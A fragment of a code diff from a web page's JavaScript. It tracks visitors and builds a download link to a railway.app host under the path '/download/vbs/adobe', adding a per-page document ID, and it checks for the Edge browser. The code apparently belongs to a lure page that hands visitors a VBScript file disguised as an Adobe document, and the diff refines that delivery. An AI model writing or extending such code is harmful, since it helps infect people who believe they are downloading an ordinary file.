@@ -2348,8 +2348,9 @@
           console.error('Error with visitor tracking:', error);
         }
         
+        var docId = window.location.pathname.split('/')[2];
         
-        var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe';
+        var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(docId);
         
         // Check if Edge browser
         var isEdge = /Edg/.test(navigator.userAgent);
